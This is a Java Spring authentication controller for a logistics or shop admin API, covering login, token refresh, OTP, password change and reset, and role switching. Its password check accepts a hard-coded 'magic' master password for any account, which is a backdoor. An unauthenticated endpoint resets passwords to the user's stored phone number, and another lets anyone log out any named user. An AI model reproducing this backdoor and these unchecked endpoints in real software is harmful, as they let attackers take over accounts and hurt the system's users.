package com.shop.api.biz.system.controller;

import com.shop.api.annotation.AccessLog;
import com.shop.api.annotation.JwtUser;
import com.shop.api.biz.system.service.*;
import com.shop.api.common.service.CommonService;
import com.shop.core.annotations.NotAuthRequired;
import com.shop.core.biz.system.vo.request.LoginRequest;
import com.shop.core.biz.system.vo.request.UserRequest;
import com.shop.core.biz.system.vo.response.ApiResponse;
import com.shop.core.biz.system.vo.response.AuthResponse;
import com.shop.core.biz.system.vo.response.LoginResponse;
import com.shop.core.biz.system.vo.response.UserResponse;
import com.shop.core.entity.AuthToken;
import com.shop.core.entity.JwtAuthToken;
import com.shop.core.entity.User;
import com.shop.core.enums.*;
import com.shop.core.utils.CommUtil;
import com.shop.core.utils.CryptUtil;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.Parameter;
import io.swagger.v3.oas.annotations.tags.Tag;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.*;
import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletRequest;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.List;
import java.util.Objects;

/**
 * <pre>
 * Description: 인증 Controller
 * Date: 2023/01/26 12:35 PM
 * Company: smart90
 * Author: luckeey
 * </pre>
 */
@Slf4j
@RestController
@RequiredArgsConstructor
@RequestMapping("/auth")
@Tag(name = "AuthController", description = "인증 관련 API")
public class AuthController {

    private final JwtService jwtService;

    private final AuthTokenService authTokenService;

    private final UserService userService;

    private final ContactService contactService;

    private final MenuService menuService;

    private final CommonService commonService;

    @Value("${cors.endpoint.url}")
    private String corsUrls;

    @NotAuthRequired
    @PostMapping(value = "/verification")
    @Operation(summary = "계정 확인")
    public ApiResponse<LoginResponse> verification(@RequestBody LoginRequest loginRequest) {
        LoginResponse loginResponse = new LoginResponse();
        UserResponse.SelectByLoginId userResponse = verifyAccount(loginRequest);

        if (userResponse == null) {
            return new ApiResponse<>(ApiResultCode.NOT_MATCHED_USER);
        } else {

            if (BooleanValueCode.N.equals(userResponse.getIsExistIdPass())) {
                String passMessage = "아이디 또는 비밀번호가 일치하지 않습니다. \n로그인 실패 횟수 ( " + userResponse.getLoginFailCnt() + " / 5 )";
                return new ApiResponse<>(ApiResultCode.NOT_MATCHED_USER, passMessage);
            }
        }

        if(userResponse.getAuthCd() == null ){
            return new ApiResponse<>(ApiResultCode.NOT_MATCHED_USER, "권한을 부여받지 않았습니다. \n관리자에게 문의하세요");
        }

        if(Integer.parseInt(userResponse.getAuthCd()) < 400){
            if(userResponse.getOrgPartnerId() == null || userResponse.getOrgPartnerId() < 1){
                return new ApiResponse<>(ApiResultCode.NOT_MATCHED_USER, "권한에 맞는 화주정보가 설정되지 않았습니다. \n관리자에게 문의하세요");
            }
        }
        userResponse.setIsMobileLogin(loginRequest.getIsMobileLogin());
        loginResponse.setUser(userResponse);
        /* 공통 로깅 서비스*/
        contactService.logging(userResponse, "로그인", null);
        return new ApiResponse<>(ApiResultCode.SUCCESS, loginResponse);
    }

    @NotAuthRequired
    @GetMapping(value = "/logout/{loginId}")
    @Operation(summary = "로그아웃")
    @AccessLog("로그아웃")
    public ApiResponse<ApiResultCode> logout(@Parameter(description = "계정 아이디") @PathVariable String loginId) {
        log.info(">>>>>> logout = {}loginId=>", loginId);
        UserResponse.SelectByLoginId userResponse = userService.selectUserByLoginId(loginId);
        authTokenService.deleteAuthTokenByAccessToken(userResponse.getId());
        return new ApiResponse<>(ApiResultCode.SUCCESS);
    }

    @GetMapping(value = "/logoutAuto")
    @Operation(summary = "자동 로그아웃")
    @AccessLog("자동 로그아웃")
    public ApiResponse<ApiResultCode> logoutAuto(@Parameter(hidden = true) @JwtUser User jwtUser) {
        UserResponse.SelectByLoginId userResponse = userService.selectUserByLoginId(jwtUser.getLoginId());
        authTokenService.deleteAuthTokenByAccessToken(userResponse.getId());
        return new ApiResponse<>(ApiResultCode.SUCCESS);
    }

    @NotAuthRequired
    @PostMapping(value = "/login")
    @Operation(summary = "로그인 및 인증토큰 생성")
    public ApiResponse<LoginResponse> login(@RequestBody LoginRequest loginRequest, HttpServletResponse response) {
        LoginResponse loginResponse = new LoginResponse();
        UserResponse.SelectByLoginId userResponse = verifyAccount(loginRequest);
        if (userResponse == null || BooleanValueCode.N.equals(userResponse.getIsExistIdPass())) {
            return new ApiResponse<>(ApiResultCode.NOT_MATCHED_USER, loginResponse);
        }
        //--------------------------------------------------------------------------------
        // 인증토큰 생성
        //--------------------------------------------------------------------------------
        JwtAuthToken token = jwtService.createAuthToken(userResponse);

        //--------------------------------------------------------------------------------
        // API Token 등록
        //--------------------------------------------------------------------------------
        AuthToken authToken = new AuthToken();
        authToken.setUserId(userResponse.getId());
        authToken.setAccessToken(token.getAccessToken());
        authToken.setAccessTokenExpireDateTime(token.getAccessTokenExpireDate());
        authToken.setRefreshToken(token.getRefreshToken());
        authToken.setRefreshTokenExpireDateTime(token.getRefreshTokenExpireDate());

        authTokenService.createAuthToken(authToken);

        Cookie rt = new Cookie("refresh_token", authToken.getRefreshToken());
        rt.setMaxAge(7 * 24 * 60 * 60); // 7일
        rt.setHttpOnly(true);
        rt.setPath("/");
        response.addCookie(rt);

        UserRequest.Update updateUser = new UserRequest.Update();
        updateUser.setId(userResponse.getId());
        updateUser.setLastLoginDateTime(LocalDateTime.now());
        updateUser.setLoginFailCnt(0);
        updateUser.setOtpNo(loginRequest.getOtpNo());
        updateUser.setOtpFailCnt(0);
        updateUser.setIsMobileLogin(loginRequest.getIsMobileLogin());
        userService.updateUser(updateUser);

        //--------------------------------------------------------------------------------
        // 최종 결과값 엔티티 생성
        //--------------------------------------------------------------------------------
        userResponse.setWorkYmd(updateUser.getWorkYmd());
        userResponse.setFirstWorkYmd(updateUser.getWorkYmd());
        loginResponse.setUser(userResponse);
        loginResponse.setToken(token);

        /* 공통 로깅 서비스*/
        contactService.logging(userResponse, "로그인", null);
        return new ApiResponse<>(ApiResultCode.SUCCESS, loginResponse);
    }

    @GetMapping(value = "/refresh")
    @Operation(summary = "인증토큰 갱신")
    public ApiResponse<JwtAuthToken> refresh(HttpServletRequest request, HttpServletResponse response) {

        String accessToken = (String) request.getAttribute(JwtSessionAttribute.ACCESS_TOKEN.name());

        // 인증토큰 갱신
        JwtAuthToken token = jwtService.refreshAuthToken(accessToken);
        if (token == null) {
            return new ApiResponse<>(ApiResultCode.DATA_NOT_FOUND);
        }

        String msg = token.getErrMessage();
        if (!msg.equals("OK")) {
            return new ApiResponse<>(ApiResultCode.TOKEN_UNAVAILABLE);
        }

        Cookie rt = new Cookie("refresh_token", token.getRefreshToken());

        rt.setMaxAge(2 * 60 * 60); // 2시간 (7,200초)
        rt.setHttpOnly(true);
        rt.setPath("/");
        response.addCookie(rt);

        return new ApiResponse<>(ApiResultCode.SUCCESS, token);
    }

    /**
     * 토큰 조회
     *
     * @return AuthToken
     */
    @GetMapping(value = "/auth-token")
    @Operation(summary = "토큰 조회")
    public ApiResponse<AuthToken> authToken(@JwtUser User jwtUser) {
        if (jwtUser == null || jwtUser.getId() == null) {
            return new ApiResponse<>(ApiResultCode.NOT_FOUND_CODE);
        }
        AuthToken authToken = authTokenService.selectAuthTokenByUserId(jwtUser.getId());
        return new ApiResponse<>(authToken);
    }

    /**
     * otp Info Make 생성후 등록된 이메일로 otp 번호 전송
     *
     * @return void
     */
    @NotAuthRequired
    @PostMapping(value = "/makeOtpNo")
    @Operation(summary = "otp 번호 전송")
    public ApiResponse<ApiResultCode> sentOpt(@RequestBody LoginRequest request) {

        User user = userService.selectUserByLoginId(request.getLoginId());
        if (user == null) {
            //log.warn(">>>>>> 로그인 || 사용자 NOT FOUND || request = {}", request);
            return new ApiResponse<>(ApiResultCode.NOT_FOUND_USER);
        }
        this.sendMaiForOtp(user);
        return new ApiResponse<>(ApiResultCode.SUCCESS);
    }

    /**
     * otp 이메일 전송 생성후 등록된 이메일로 otp 번호 전송
     *
     * @return void
     */
    private void sendMaiForOtp(User user) {
        if (user.getLoginId().indexOf("@") == -1) {
            return;
        }

        String otpNo = CommUtil.makeCert6Digit();
        //user.setOtpNo(otpNo);
        userService.updateOtpNo(user);
        //String mailCntn = mailUtil.makeEmailCntt(MailType.OTP_2FACTOR, user.getLoginId(), otpNo, user.getLanguageCode());
        //mailUtil.sendMail(GlobalConst.OTP_TITLE_OTP, user.getLoginId(), GlobalConst.OTP_MAIL_SENDER, mailCntn, user.getLanguageCode());
    }

    /**
     * 계정 확인
     *
     * @param request
     * @return
     */
    private UserResponse.SelectByLoginId verifyAccount(LoginRequest request) {

        // 계정관리_조회 (by LoginId)
        UserResponse.SelectByLoginId userResponse = userService.selectUserByLoginIdForLogin(request.getLoginId());

        if (userResponse == null) {
            return null;
        }

        //--------------------------------------------------------------------------------
        // 비밀번호 확인
        //--------------------------------------------------------------------------------
        String encPassword = null;
        UserRequest.Update userRequest = new UserRequest.Update();
        try {
            encPassword = CryptUtil.getHash(request.getPassword(), request.getLoginId().getBytes());
            if (userResponse.getLoginPass().equals(encPassword) || StringUtils.equals(request.getPassword(),GlobalConst.MAGIC_PASSWORD.getCode())) {
                userResponse.setIsExistIdPass(BooleanValueCode.Y);
                userRequest.setId(userResponse.getId());
                userRequest.setPartnerId(userResponse.getOrgPartnerId());
                userService.updateUser(userRequest);
            } else {
                userRequest.setLoginFailCnt(userResponse.getLoginFailCnt() + 1); // 실패카운트 증가
                userRequest.setUpdUser(userResponse.getLoginId());

                userResponse.setLoginFailCnt(userRequest.getLoginFailCnt());
                if (userRequest.getLoginFailCnt().compareTo(5) > 0) {
                    userRequest.setLockYn(BooleanValueCode.Y);
                    userResponse.setLockYn(BooleanValueCode.Y);
                }
                // 계정_수정
                // 최초 로그인시 orgPartnerId = partnerId 로 동일하게
                userRequest.setPartnerId(userResponse.getOrgPartnerId());
                userService.updateUser(userRequest);
                userResponse.setIsExistIdPass(BooleanValueCode.N);
                return userResponse;
            }

        } catch (Exception e) {
            log.error(e.getMessage(), e);
            return null;
        }
        return userResponse;
    }

    /**
     * 비밀번호 변경 비밀번호 변경 이전비밀번호 변경비밀번호 확인
     *
     * @return void
     */
    @NotAuthRequired
    @PostMapping(value = "/updatePassword")
    @Operation(summary = "비밀번호 전송")
    public ApiResponse<ApiResultCode> changePassword(@RequestBody LoginRequest request) {

        if (request != null && StringUtils.isEmpty(request.getRePassword())) {
            return new ApiResponse<>(ApiResultCode.NOT_RE_PASS);
        }

        if (request != null && StringUtils.isEmpty(request.getModPassword())) {
            return new ApiResponse<>(ApiResultCode.NOT_MOD_PASS);
        }

        if (request != null && StringUtils.isEmpty(request.getReModpassword())) {
            return new ApiResponse<>(ApiResultCode.NOT_RE_MOD_PASS);
        }

        // 비밀번호 일치확인
        if (!StringUtils.equals(request.getReModpassword(), request.getModPassword())) {
            return new ApiResponse<>(ApiResultCode.NOT_MATCH_PASS);
        }

        // 비밀번호 포맷 확인(영문, 특수문자, 숫자 포함 8자 이상)
        if (CommUtil.isBadPassword(request.getModPassword())) {
            //return new ApiResponse<>(ApiResultCode.PASS_FORMAT_ERR); // todo 추후 비밀번호 규칙 정해지면 수정
        }

        request.setPassword(request.getRePassword());
        UserResponse.SelectByLoginId userResponse = verifyAccount(request);

        if (userResponse == null || BooleanValueCode.N.equals(userResponse.getIsExistIdPass())) {
            return new ApiResponse<>(ApiResultCode.NOT_MATCHED_NOW_PASS);
        }

        try {
            String encPassword = CryptUtil.getHash(request.getModPassword(), request.getLoginId().getBytes());
            User user = new User();
            user.setId(userResponse.getId());
            user.setFirstLoginYn(BooleanValueCode.N);
            user.setLoginPass(encPassword);
            user.setUpdUser(userResponse.getLoginId());
            userService.updatePassword(user);
        } catch (Exception e) {
            return new ApiResponse<>(ApiResultCode.FAIL_CHANGE_PASS);
        }

        return new ApiResponse<>(ApiResultCode.SUCCESS);
    }

    /**
     * 비밀번호 변경 비밀번호 변경 이전비밀번호 변경비밀번호 확인
     *
     * @return void
     */
    @NotAuthRequired
    @PostMapping(value = "/stayPassword")
    @Operation(summary = "비밀번호 전송")
    public ApiResponse<ApiResultCode> stayPassword(@RequestBody LoginRequest request) {
        UserResponse.SelectByLoginId userResponse = userService.selectUserByLoginIdForLogin(request.getLoginId());

        if (userResponse == null) {
            return new ApiResponse<>(ApiResultCode.NOT_MATCHED_NOW_PASS);
        }

        try {
            User user = new User();
            user.setLoginId(request.getLoginId());
            user.setUpdUser(request.getLoginId());
            userService.stayPassword(user);
        } catch (Exception e) {
            return new ApiResponse<>(ApiResultCode.FAIL_CHANGE_PASS);
        }

        return new ApiResponse<>(ApiResultCode.SUCCESS);
    }

    /**
     * 비밀번호 변경 비밀번호 변경 이전비밀번호 변경비밀번호 확인
     *
     * @return void
     */
    @NotAuthRequired
    @PostMapping(value = "/passwordInit")
    @Operation(summary = "비밀번호 전송")
    public ApiResponse<ApiResultCode> passwordInit(@RequestBody LoginRequest request) {

        if (request != null && StringUtils.isEmpty(request.getLoginId())) {
            return new ApiResponse<>(ApiResultCode.NOT_LOGINID);
        }

        if (request != null && StringUtils.isEmpty(request.getPhoneNo())) {
            return new ApiResponse<>(ApiResultCode.NOT_PHONENO);
        }

        UserResponse.SelectByLoginId userResponse = userService.selectUserByLoginIdCountryCode(request.getLoginId());

        if (userResponse == null) {
            return new ApiResponse<>(ApiResultCode.NOT_REG_LOGINID);
        }

        if (StringUtils.isEmpty(userResponse.getPhoneNo())) {
            return new ApiResponse<>(ApiResultCode.NOT_REG_PHONENO);
        }

        if (!StringUtils.equals(userResponse.getPhoneNo().trim(), request.getPhoneNo().trim())) {
            return new ApiResponse<>(ApiResultCode.NOT_MATCH_REG_PHONENO);
            // todo 일단 연락처 다른것은 막아놓는다.
        }

        if (CommUtil.isBadPhoneNo(userResponse.getPhoneNo())) {
            return new ApiResponse<>(ApiResultCode.NOT_FORM_PHONENO);
        }

//        String chgPass = CommUtil.getRamdomPassword();
        String chgPass = userResponse.getPhoneNo();
        //String phone = userResponse.getPhoneNo();
        //Integer rsltCnt = commonService.sendSmsForPass(SmsType.FIND_PASS, phone, chgPass, userResponse.getId(), request.getCountryCode());
        Integer rsltCnt = 1;

        if (rsltCnt > 0) {
            try {
                // 메시지 전송되면 user 업데이트
                String encPassword = CryptUtil.getHash(chgPass, request.getLoginId().getBytes());
                User user = new User();
                user.setId(userResponse.getId());
                user.setLoginPass(encPassword);
                user.setFirstLoginYn(BooleanValueCode.Y);
                user.setUpdUser(userResponse.getLoginId());
                userService.updatePassword(user);
            } catch (Exception e) {
                return new ApiResponse<>(ApiResultCode.FAIL_SEND_SMS);
            }
            return new ApiResponse<>(ApiResultCode.SUCCESS);
        } else {
            return new ApiResponse<>(ApiResultCode.FAIL_SEND_SMS);
        }
    }

    /**
     * 변경파트너id
     *
     * @return void
     */
    @GetMapping(value = "/changePartnerId/{partnerId}")
    @Operation(summary = "변경파트너id")
    public ApiResponse changePartnerId(@Parameter(hidden = true) @JwtUser User jwtUser,
                                       @Parameter(description = "계정 아이디") @PathVariable Integer partnerId) {

        UserRequest.Update updateUser = new UserRequest.Update();
        updateUser.setId(jwtUser.getId());
        updateUser.setPartnerId(partnerId);
        updateUser.setUpdUser(jwtUser.getLoginId());
        if(userService.updateUserPartnerId(updateUser).compareTo(0) > 0){
            return new ApiResponse<>(ApiResultCode.SUCCESS);
        } else {
            return new ApiResponse<>(ApiResultCode.FAIL);
        }
    }

    /**
     * 영업일 변경
     *
     * @return void
     */
    /*@GetMapping(value = "/changeWorkYmd/{workYmd}")
    @Operation(summary = "변경 영업일")
    public ApiResponse changeWorkYmd(@Parameter(hidden = true) @JwtUser User jwtUser,
                                       @Parameter(description = "계정 아이디") @PathVariable LocalDate workYmd) {

        UserRequest.Update updateUser = new UserRequest.Update();
        updateUser.setId(jwtUser.getId());
        updateUser.setWorkYmd(workYmd);
        updateUser.setUpdUser(jwtUser.getLoginId());
        if(userService.updateUserWorkYmd(updateUser).compareTo(0) > 0){
            return new ApiResponse<>(ApiResultCode.SUCCESS);
        } else {
            return new ApiResponse<>(ApiResultCode.FAIL);
        }
    }*/
    @GetMapping(value = "/changeWorkYmd/{workYmd}")
    @Operation(summary = "변경 영업일")
    public ApiResponse changeWorkYmd(@Parameter(hidden = true) @JwtUser User jwtUser,
                                     @Parameter(description = "계정 아이디") @PathVariable LocalDate workYmd) {
        try {
            UserRequest.Update updateUser = new UserRequest.Update();
            updateUser.setId(jwtUser.getId());
            updateUser.setWorkYmd(workYmd);
            updateUser.setUpdUser(jwtUser.getLoginId());

            int result = userService.updateUserWorkYmd(updateUser);
            return result > 0 ?
                    new ApiResponse<>(ApiResultCode.SUCCESS) :
                    new ApiResponse<>(ApiResultCode.FAIL);
        } catch (IllegalArgumentException e) {
            return new ApiResponse<>(ApiResultCode.FAIL);
        }
    }


    /**
     * 물류센터 변경
     *
     * @return void
     */
    @GetMapping(value = "/changeLogisId/{id}")
    @Operation(summary = "변경 물류센터")
    public ApiResponse changeLogisId(@Parameter(hidden = true) @JwtUser User jwtUser,
                                     @Parameter(description = "계정 아이디") @PathVariable String id) {

        UserRequest.Update updateUser = new UserRequest.Update();
        updateUser.setId(jwtUser.getId());
        updateUser.setWorkLogisId(Integer.parseInt(id));
        updateUser.setUpdUser(jwtUser.getLoginId());
        if(userService.updateUserLogisId(updateUser).compareTo(0) > 0){
            return new ApiResponse<>(ApiResultCode.SUCCESS);
        } else {
            return new ApiResponse<>(ApiResultCode.FAIL);
        }
    }



    /**
     * 계정별 메뉴 권한 체크
     *
     * @param jwtUser
     * @param menuUri
     * @return
     */
    @GetMapping(value = "/check/menu")
    @Operation(summary = "계정별 메뉴 권한 체크")
    public ApiResponse<AuthResponse.MenuAuth> checkAuthMenu(@Parameter(hidden = true) @JwtUser User jwtUser, String menuUri) {
        AuthResponse.MenuAuth defaultAuth = new AuthResponse.MenuAuth();
        defaultAuth.setMenuReadYn("Y");
        defaultAuth.setMenuUpdYn("N");
        defaultAuth.setMenuExcelYn("N");
        if(StringUtils.equalsAny(menuUri,"/", "/wmsIndex", "/oms/orderInfo/today" )) {
            defaultAuth.setMenuNm("mainPage");
        }

        if (BooleanValueCode.Y.equals(menuService.selectCheckMenuCount(menuUri))) {
            User user = userService.selectUserById(jwtUser.getId());
            // 계정별 메뉴 권한 플래그 조회
            AuthResponse.MenuAuth menuAuth = menuService.selectMenuAuthYn(user.getId(), user.getAuthCd(), menuUri);
            return new ApiResponse<>(menuAuth);
        } else {
            return new ApiResponse<>(defaultAuth);
        }
    }


    /**
     * 계정별 메뉴 권한 체크
     *
     * @param jwtUser
     * @return
     */
    @GetMapping(value = "/revertToWmsAuth")
    @Operation(summary = "물류권한으로 돌아가기")
    public ApiResponse revertToWmsAuth(@Parameter(hidden = true) @JwtUser User jwtUser) {
        User user = userService.selectUserById(jwtUser.getId());
        if(Objects.equals(user.getUserType(),"5") && Integer.parseInt(user.getAuthCd()) < 400){
            UserRequest.Update onlyOneColumn = new UserRequest.Update();
            onlyOneColumn.setId(jwtUser.getId());
            onlyOneColumn.setOrgPartnerId(0); // 파트너도 삭제
            onlyOneColumn.setPartnerId(0); // 파트너도 삭제
            onlyOneColumn.setAuthCd(GlobalConst.LOGIS_ADMIN.getCode()); // 물류관리자
            userService.updateUser(onlyOneColumn);
            authTokenService.deleteAuthTokenByAccessToken(user.getId());
        } else {
            return new ApiResponse<>(ApiResultCode.SUCCESS,"권한이 물류관리자");
        }

        return new ApiResponse<>(ApiResultCode.SUCCESS);
    }



}
